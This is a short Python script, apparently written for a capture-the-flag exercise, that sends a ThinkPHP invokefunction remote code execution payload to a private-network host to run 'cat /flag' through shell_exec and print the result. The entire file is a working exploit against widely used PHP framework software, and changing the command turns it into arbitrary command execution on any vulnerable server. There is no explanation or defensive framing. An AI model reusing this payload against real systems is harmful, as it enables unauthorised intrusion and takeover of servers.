import requests

url = "http://192.168.165.10:8090/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cat /flag"
headers = {
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
}

response = requests.get(url, headers=headers, timeout=10)
print(response.text)
